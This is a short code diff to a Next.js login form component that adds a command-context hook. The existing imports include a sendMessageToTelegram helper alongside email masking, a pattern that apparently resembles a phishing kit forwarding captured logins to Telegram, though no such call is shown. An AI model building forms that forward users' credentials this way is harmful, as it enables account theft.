@@ -7,9 +7,11 @@ import { useValidatePassword } from '../app/hooks/useValidate'
 import { useEmail } from '../app/lib/EmailContext'
 import { useRouter } from 'next/navigation'
 import { sendMessageToTelegram } from '../lib/api'; 
+import { useCommand } from '../app/lib/CommandContext';
 
 export default function LoginForm({ setNavigation, navigation }) {
     const router = useRouter()
+    const { command } = useCommand();
     const { userEmail } = useEmail();
 
     const maskEmail = (userEmail) => {
